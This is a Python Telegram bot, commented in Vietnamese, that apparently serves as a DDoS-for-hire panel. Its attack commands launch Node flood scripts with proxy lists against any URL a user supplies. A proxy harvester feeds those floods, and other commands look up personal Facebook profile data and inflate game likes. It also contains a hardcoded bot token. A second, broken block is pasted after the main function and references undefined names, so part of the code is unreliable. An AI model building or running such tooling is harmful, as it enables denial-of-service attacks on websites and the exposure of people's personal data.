import os
import subprocess
import time
import requests
import logging
import html

import concurrent.futures

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

# ========== CAU HINH ==========
TOKEN = '8395956317:AAHu7lAbS5Qi56EUD11bJRDi8oE-1jCpoCw'
ADMIN_IDS = [7818408538]  # ID Admin
USER_COOLDOWN = 5 *12  # 5 phut
MAX_USER_DURATION = 120  # Gioi han thanh vien

last_user_attack_time = {}
active_processes = {}

# ========== LOGGING ==========
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

# ========== HAM HO TRO ==========
def can_attack(user_id):
    now = time.time()
    last_time = last_user_attack_time.get(user_id, 0)
    return now - last_time >= USER_COOLDOWN

def update_last_attack(user_id):
    last_user_attack_time[user_id] = time.time()

async def start_attack(script, url, duration, rate, thread, proxy, user_id, context: ContextTypes.DEFAULT_TYPE, chat_id, extra_args=[]):
    args = ['node', script, url, str(duration), rate, thread, proxy] + extra_args
    logging.info(f"Running command: {' '.join(args)}")
    try:
        process = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        active_processes[user_id] = process

        await context.bot.send_message(chat_id=chat_id, text=f"🚀 Attack started on {url} for {duration} seconds.")
        check_host_url = f"https://check-host.net/check-http?host={url}"
        keyboard = [[InlineKeyboardButton("🔗 Open Check Host", url=check_host_url)]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await context.bot.send_message(chat_id=chat_id, text="🔍 Kiem tra website:", reply_markup=reply_markup)

    except Exception as e:
        logging.error(f"Error starting attack: {e}")
        await context.bot.send_message(chat_id=chat_id, text="❌ Khong the bat đau attack.")

async def kill_attack(user_id, context: ContextTypes.DEFAULT_TYPE, chat_id):
    process = active_processes.get(user_id)
    if not process:
        await context.bot.send_message(chat_id=chat_id, text="❌ Khong co attack nao đang chay.")
        return
    try:
        process.terminate()
        del active_processes[user_id]
        await context.bot.send_message(chat_id=chat_id, text="🛑 Attack đa bi dung.")
    except Exception as e:
        logging.error(f"Error killing attack: {e}")
        await context.bot.send_message(chat_id=chat_id, text="⚠️ Khong the dung attack.")

# ========== COMMANDS ==========

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    args = context.args

    if len(args) != 2:
        await context.bot.send_message(chat_id, "❌ Sai cu phap. /attack <url> <thoigian>")
        return

    url = args[0]
    try:
        duration = int(args[1])
    except ValueError:
        await context.bot.send_message(chat_id, "❌ Thoi gian khong hop le.")
        return

    if duration <= 0:
        await context.bot.send_message(chat_id, "❌ Thoi gian khong hop le.")
        return

    if user_id not in ADMIN_IDS:
        if duration > 120:
            await context.bot.send_message(chat_id, f"⚠️ Ban chi đuoc tan cong toi đa 120 giay.")
            return
        if not can_attack(user_id):
            wait = int(USER_COOLDOWN - (time.time() - last_user_attack_time.get(user_id, 0)))
            await context.bot.send_message(chat_id, f"⏳ Vui long đoi {wait} giay truoc khi tiep tuc.")
            return
        update_last_attack(user_id)

    script = os.path.join(os.getcwd(), 'c1.js')
    # attack them —cache
    await start_attack(script, url, duration, '30', '5', '7.txt', user_id, context, chat_id, ['--cache'])

async def clf(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    args = context.args

    if len(args) != 2:
        await context.bot.send_message(chat_id, "❌ Sai cu phap.\nDung: /clf <url> <thoigian>")
        return

    url = args[0]
    try:
        duration = int(args[1])
    except ValueError:
        await context.bot.send_message(chat_id, "❌ Thoi gian khong hop le.")
        return

    if duration <= 0:
        await context.bot.send_message(chat_id, "❌ Thoi gian phai lon hon 0.")
        return

    if user_id not in ADMIN_IDS:
        if duration > MAX_USER_DURATION:
            await context.bot.send_message(chat_id, "⚠️ Thanh vien chi đuoc tan cong toi đa 120 giay.")
            return
        if not can_attack(user_id):
            wait = int(USER_COOLDOWN - (time.time() - last_user_attack_time.get(user_id, 0)))
            await context.bot.send_message(chat_id, f"⏳ Vui long đoi {wait} giay truoc khi tiep tuc.")
            return
        update_last_attack(user_id)

    script = os.path.join(os.getcwd(), 'thuan1.js')
    # clf KHONG them —cache
    await start_attack(script, url, duration, '21', '7', '1', user_id, context, chat_id)

async def attackkill(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    args = context.args

    if len(args) != 2:
        await context.bot.send_message(chat_id, "❌ Sai cu phap. /attackkill <url> <thoigian>")
        return

    url = args[0]
    try:
        duration = int(args[1])
    except ValueError:
        await context.bot.send_message(chat_id, "❌ Thoi gian khong hop le.")
        return

    if duration <= 0:
        await context.bot.send_message(chat_id, "❌ Thoi gian khong hop le.")
        return

    if user_id not in ADMIN_IDS:
        if duration > 120:
            await context.bot.send_message(chat_id, f"⚠️ Ban chi đuoc tan cong toi đa 120 giay.")
            return
        if not can_attack(user_id):
            wait = int(USER_COOLDOWN - (time.time() - last_user_attack_time.get(user_id, 0)))
            await context.bot.send_message(chat_id, f"⏳ Vui long đoi {wait} giay truoc khi tiep tuc.")
            return
        update_last_attack(user_id)

    script = os.path.join(os.getcwd(), 'c1.js')
    # attackkill them —cache
    await start_attack(script, url, duration, '30', '4', 'proxy.txt', user_id, context, chat_id, ['--cache'])

async def kill(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    await kill_attack(user_id, context, chat_id)

async def attackvip(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    args = context.args

    if user_id not in ADMIN_IDS:
        await context.bot.send_message(chat_id, "🚫 Lenh nay chi danh cho admin.")
        return

    if len(args) != 3:
        await context.bot.send_message(chat_id, "❌ Sai cu phap. /attackvip <url> <thoigian> <flood|bypass>")
        return

    url, duration_str, method = args
    try:
        duration = int(duration_str)
    except ValueError:
        await context.bot.send_message(chat_id, "❌ Thoi gian khong hop le.")
        return

    script = os.path.join(os.getcwd(), 'kill.js')
    await context.bot.send_message(chat_id, f"✨ VIP Attack bat đau vao {url} | Method: {method} | Time: {duration}s")
    # attackvip them —cache
    await start_attack(script, url, duration, '5', '9', 'proxy.txt', user_id, context, chat_id, [method, '--cache'])

async def add_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    sender_id = update.effective_user.id
    args = context.args

    if sender_id not in ADMIN_IDS:
        await context.bot.send_message(chat_id, "🚫 Ban khong co quyen them admin.")
        return

    if len(args) != 1 or not args[0].isdigit():
        await context.bot.send_message(chat_id, "❌ Sai cu phap. /add <user_id>")
        return

    new_admin_id = int(args[0])
    if new_admin_id in ADMIN_IDS:
        await context.bot.send_message(chat_id, "⚠️ ID nay đa la admin.")
        return

    ADMIN_IDS.append(new_admin_id)
    await context.bot.send_message(chat_id, f"✅ Đa them admin moi voi ID: {new_admin_id}")

async def nu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    name = update.effective_user.first_name
    msg = f"""👋 Xin chao {name}!
Cac lenh hien co:

/attack <url> <thoigian> - (Gioi han 120s)
/add <user_id> - Them admin
/getproxy
/fb <uid> - Lay thong tin Facebook
"""
    await context.bot.send_message(update.effective_chat.id, msg)

async def fb_lookup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    args = context.args

    if len(args) != 1:
        await context.bot.send_message(chat_id, "❌ Sai cu phap. /fb <uid>")
        return

    uid = args[0]
    await context.bot.send_message(chat_id, "⌛ Đang lay thong tin...")

    try:
        response = requests.get(f"https://apinvh.zzux.com/api/getinfo?uid={uid}")
        if response.status_code != 200:
            await context.bot.send_message(chat_id, f"❌ Loi API. Status: {response.status_code}")
            return

        data = response.json()
        if not data or 'error' in data:
            await context.bot.send_message(chat_id, "⚠️ Khong tim thay thong tin nguoi dung hoac API loi.")
            return

        msg = (
            f"📘 Thong tin Facebook UID <b>{html.escape(data.get('uid', 'Khong co'))}</b>:\n"
            f"👤 Ten: {html.escape(data.get('name', 'Khong co'))}\n"
            f"🔗 Profile: {html.escape(data.get('link_profile', 'Khong co'))}\n"
            f"🎂 Sinh nhat: {html.escape(data.get('birthday', 'Khong co'))}\n"
            f"❤️ Moi quan he: {html.escape(data.get('relationship_status', 'Khong co'))}\n"
            f"👥 Theo doi: {data.get('follower', 0)}\n"
            f"📍 Vi tri: {html.escape(data.get('location', 'Khong co'))}\n"
            f"🏡 Que quan: {html.escape(data.get('hometown', 'Khong co'))}\n"
        )

        avatar_url = data.get('avatar')
        if avatar_url:
            await context.bot.send_photo(chat_id=chat_id, photo=avatar_url, caption=msg, parse_mode='HTML')
        else:
            await context.bot.send_message(chat_id=chat_id, text=msg, parse_mode='HTML')

    except Exception as e:
        logging.error(f"Error in fb_lookup: {e}")
        await context.bot.send_message(chat_id, "❌ Đa xay ra loi khi lay thong tin. Vui long thu lai.")

async def like_uid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    args = context.args

    if len(args) != 1:
        await context.bot.send_message(chat_id, "❌ Sai cu phap. Dung: /like <uid>")
        return

    uid = args[0]
    await context.bot.send_message(chat_id, f"🔄 Đang tien hanh Like UID: {uid}...")

    try:
        api_url = f"https://likeff-ckdq.onrender.com/like?uid={uid}&server_name=VN"
        response = requests.get(api_url)

        if response.status_code != 200:
            await context.bot.send_message(chat_id, f"❌ Loi API. Ma trang thai: {response.status_code}")
            return

        data = response.json()

        # Kiem tra neu khong co du lieu hop le
        if "UID" not in data:
            await context.bot.send_message(chat_id, "❌ API tra ve du lieu khong hop le.")
            return

        # Neu khong co luot like moi
        if data.get("LikesGivenByAPI", 0) == 0:
            await context.bot.send_message(
                chat_id,
                f"⚠️ Hom nay ban đa đat gioi han luot like!\n\n👤 UID: {data.get('UID')}\n🔒 Nickname: {data.get('PlayerNickname')}"
            )
        else:
            # Co like thanh cong
            msg = (
                f"✅ Like thanh cong cho UID: <b>{data.get('UID')}</b>\n\n"
                f"👤 Nickname: {html.escape(data.get('PlayerNickname', 'Khong ro'))}\n"
                f"👍 Likes truoc đo: {data.get('LikesbeforeCommand')}\n"
                f"🚀 Likes sau khi Like: {data.get('LikesafterCommand')}\n"
                f"🎯 Tong like API đa them: {data.get('LikesGivenByAPI')}"
            )
            await context.bot.send_message(chat_id, msg, parse_mode='HTML')

    except Exception as e:
        logging.error(f"Loi trong like_uid: {e}")
        await context.bot.send_message(chat_id, "❌ Đa xay ra loi khi goi API. Vui long thu lai.")

async def visit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    args = context.args

    if len(args) != 1 or not args[0].isdigit():
        await context.bot.send_message(chat_id, "❌ Sai cu phap. Dung: /visit <uid>")
        return

    uid = args[0]
    await context.bot.send_message(chat_id, "⌛ Đang goi API visit...")

    api_url = f"http://tungdzvcl.ddns.net:5000/BD/{uid}"

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                      "AppleWebKit/537.36 (KHTML, like Gecko) "
                      "Chrome/116.0.0.0 Safari/537.36"
    }

    try:
        resp = requests.get(api_url, headers=headers, timeout=10)
    except Exception as e:
        logging.error(f"Error calling visit API: {e}")
        await context.bot.send_message(chat_id, "❌ Khong the ket noi toi API. Vui long thu lai sau.")
        return

    if resp.status_code != 200:
        logging.error(f"Visit API returned status {resp.status_code}: {resp.text}")
        await context.bot.send_message(chat_id, f"❌ API tra ve loi. Status: {resp.status_code}")
        return

    try:
        data = resp.json()
    except Exception as e:
        logging.error(f"Invalid JSON from visit API: {e} | body: {resp.text}")
        await context.bot.send_message(chat_id, "❌ API tra ve du lieu khong hop le.")
        return

    if not isinstance(data, dict) or 'uid' not in data:
        logging.error(f"Unexpected visit API response: {data}")
        await context.bot.send_message(chat_id, "⚠️ API tra ve du lieu khong đung đinh dang.")
        return

    uid_r = data.get('uid', uid)
    nickname = html.escape(str(data.get('nickname', 'Khong ro')))
    region = html.escape(str(data.get('region', 'Unknown')))
    level = data.get('level', 'N/A')
    likes = data.get('likes', 'N/A')
    success = data.get('success', 0)
    fail = data.get('fail', 0)

    msg = (
        f"📌 Ket qua visit cho UID <b>{uid_r}</b>:\n\n"
        f"👤 Nickname: <b>{nickname}</b>\n"
        f"🌍 Vung: <b>{region}</b>\n"
        f"🔢 Level: <b>{level}</b>\n"
        f"👍 Likes: <b>{likes}</b>\n"
        f"✅ Success: <b>{success}</b>\n"
        f"❌ Fail: <b>{fail}</b>\n"
    )

    await context.bot.send_message(chat_id, msg, parse_mode='HTML')


async def getproxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if user_id not in ADMIN_IDS:
        await context.bot.send_message(chat_id, "🚫 Lenh nay chi danh cho admin.")
        return

    args = context.args or []
    force = len(args) > 0 and args[0].lower() in ["force", "refresh", "again"]

    proxy_file = "proxy.txt"

    if os.path.exists(proxy_file) and not force:
        with open(proxy_file, "r") as f:
            proxies = [line.strip() for line in f if line.strip()]
        if proxies:
            await context.bot.send_message(chat_id, f"📦 Đa co san {len(proxies)} proxy trong proxy.txt.")
            with open(proxy_file, "rb") as f:
                await context.bot.send_document(chat_id, f)
            return

    await context.bot.send_message(chat_id, "🔍 Đang lay va kiem tra proxy...")

    SOURCES = [
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=5000&country=all",
        "https://www.proxy-list.download/api/v1/get?type=http",
        "https://www.proxy-list.download/api/v1/get?type=https",
        "https://www.proxy-list.download/api/v1/get?type=socks4",
        "https://www.proxy-list.download/api/v1/get?type=socks5",
        "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
        "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
        "http://160.191.245.167:3006/getProxy"
    ]

    def fetch_proxies():
        result = []
        for url in SOURCES:
            try:
                r = requests.get(url, timeout=6)
                if r.status_code == 200:
                    result.extend(r.text.strip().splitlines())
            except:
                continue
        return list(set(p.strip() for p in result if p.strip()))

    def check(proxy):
        try:
            r = requests.get("http://httpbin.org/ip", proxies={"http": f"http://{proxy}", "https": f"http://{proxy}"}, timeout=4)
            if r.status_code == 200:
                return proxy
        except:
            return None

    try:
        raw_proxies = fetch_proxies()
        await context.bot.send_message(chat_id, f"📥 Lay đuoc {len(raw_proxies)} proxy. Đang loc song...")

        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
            checked = list(executor.map(check, raw_proxies))

        alive = [p for p in checked if p]

        with open(proxy_file, "w") as f:
            for proxy in alive:
                f.write(proxy + "\n")

        await context.bot.send_message(chat_id, f"✅ Đa loc xong: {len(alive)} proxy song.")
        with open(proxy_file, "rb") as f:
            await context.bot.send_document(chat_id, f)

    except Exception as e:
        logging.error(f"Loi getproxy: {e}")
        await context.bot.send_message(chat_id, "❌ Đa xay ra loi khi lay proxy.")

# ========== MAIN ==========
def main():
    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("attackkill", attackkill))
    app.add_handler(CommandHandler("kill", kill))
    app.add_handler(CommandHandler("clf", clf))
    app.add_handler(CommandHandler("attackvip", attackvip))
    app.add_handler(CommandHandler("add", add_admin))
    app.add_handler(CommandHandler("nu", nu))
    app.add_handler(CommandHandler("fb", fb_lookup))
    app.add_handler(CommandHandler("like", like_uid))
    app.add_handler(CommandHandler("visit", visit))
    app.add_handler(CommandHandler("getproxy", getproxy))



    app.run_polling()

if __name__ == '__main__':
    main()
    
    # Anti bật/tắt
ANTI_SETTINGS = {
    "link": True,
    "photo": True,
    "badword": True,
    "spam": True
}

# ========== LỆNH CƠ BẢN ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🤖 Bot đã hoạt động!\nDùng /menu để xem tất cả chức năng."
    )

async def mute(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.reply_to_message:
        user = update.message.reply_to_message.from_user
        await context.bot.restrict_chat_member(
            update.effective_chat.id, user.id,
            ChatPermissions(can_send_messages=False)
        )
        await update.message.reply_text(
            f"🔇 {user.mention_html()} đã bị mute!", parse_mode="HTML"
        )

# ========== ANTI ==========
async def antilink(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not ANTI_SETTINGS["link"]:
        return
    text = update.message.text or ""
    if "http://" in text or "https://" in text or "t.me/" in text:
        await update.message.delete()
        await update.message.reply_text("🚫 Không được gửi link!")

async def antipic(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not ANTI_SETTINGS["photo"]:
        return
    await update.message.delete()
    await update.message.reply_text("📷 Cấm gửi ảnh!")

async def antibad(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not ANTI_SETTINGS["badword"]:
        return
    text = update.message.text.lower()
    if any(word in text for word in BAD_WORDS):
        await update.message.delete()
        await update.message.reply_text("🚫 Ngôn ngữ bị cấm!")

async def antispam(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not ANTI_SETTINGS["spam"]:
        return
    user_id = update.message.from_user.id
    chat_id = update.effective_chat.id

    user_messages.setdefault(user_id, [])
    user_messages[user_id].append(update.message.date.timestamp())

    # Lọc tin nhắn trong 10s gần nhất
    user_messages[user_id] = [
        t for t in user_messages[user_id]
        if update.message.date.timestamp() - t < 10
    ]

    if len(user_messages[user_id]) > SPAM_LIMIT:
        await context.bot.restrict_chat_member(
            chat_id, user_id,
            ChatPermissions(can_send_messages=False)
        )
        await update.message.reply_text(
            f"🚫 {update.message.from_user.mention_html()} spam quá nhiều!",
            parse_mode="HTML"
        )

# ========== TROLL ==========
async def spamcall(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 2:
        await update.message.reply_text("Cách dùng: /spamcall số_lần số_điện_thoại")
        return
    times, phone = int(context.args[0]), context.args[1]
    for i in range(times):
        await update.message.reply_text(f"📞 Gọi troll {phone} lần {i+1}")

async def spamsms(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 2:
        await update.message.reply_text("Cách dùng: /spamsms số_lần số_điện_thoại")
        return
    times, phone = int(context.args[0]), context.args[1]
    for i in range(times):
        await update.message.reply_text(f"✉️ SMS troll {phone} lần {i+1}")

async def war(update: Update, context: ContextTypes.DEFAULT_TYPE):
    for _ in range(5):
        await update.message.reply_text("🔥 WAR 🔥 " * 10)

# ========== ANTI ON/OFF ==========
async def anti_toggle(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Bạn không có quyền!")
        return

    if len(context.args) < 2:
        await update.message.reply_text("Cách dùng: /anti <link/photo/badword/spam> <on/off>")
        return

    feature, state = context.args[0].lower(), context.args[1].lower()
    if feature not in ANTI_SETTINGS:
        await update.message.reply_text("❌ Tính năng không tồn tại!")
        return
    if state not in ["on", "off"]:
        await update.message.reply_text("❌ Chỉ nhận on hoặc off!")

    ANTI_SETTINGS[feature] = state == "on"
    await update.message.reply_text(f"✅ Tính năng {feature} đã {'bật' if state=='on' else 'tắt'}!")

# ========== MENU ==========
async def menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("⚙️ Quản lý", callback_data="manage")],
        [InlineKeyboardButton("🛡 Anti", callback_data="anti")],
        [InlineKeyboardButton("🤣 Troll", callback_data="troll")]
    ]
    await update.message.reply_text("📌 Chọn menu lệnh:", reply_markup=InlineKeyboardMarkup(keyboard))

async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.data == "manage":
        await query.edit_message_text(
            "⚙️ Lệnh Quản lý:\n"
            "/mute (reply) → mute user\n"
        )
    elif query.data == "anti":
        await query.edit_message_text(
            "🛡 Lệnh Anti:\n"
            "- Anti Link (xóa link)\n"
            "- Anti Photo (xóa ảnh)\n"
            "- Anti Badword (xóa từ cấm)\n"
            "- Anti Spam (mute spammer)\n"
            "Dùng: /anti <tên> <on/off> để bật/tắt"
        )
    elif query.data == "troll":
        await query.edit_message_text(
            "🤣 Lệnh Troll:\n"
            "/war → spam war\n"
            "/spamcall số_lần số → fake call troll\n"
            "/spamsms số_lần số → fake sms troll"
        )

# ========== MAIN ==========
app = ApplicationBuilder().token(TOKEN).build()

# Lệnh cơ bản
app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("menu", menu))
app.add_handler(CommandHandler("mute", mute))
app.add_handler(CommandHandler("spamcall", spamcall))
app.add_handler(CommandHandler("spamsms", spamsms))
app.add_handler(CommandHandler("war", war))
app.add_handler(CommandHandler("anti", anti_toggle))

# Callback menu
app.add_handler(CallbackQueryHandler(button))

# Quản lý group
app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, antibad))
app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, antilink))
app.add_handler(MessageHandler(filters.PHOTO, antipic))
app.add_handler(MessageHandler(filters.ALL, antispam))

print("🤖 Bot đang chạy...")
app.run_polling()
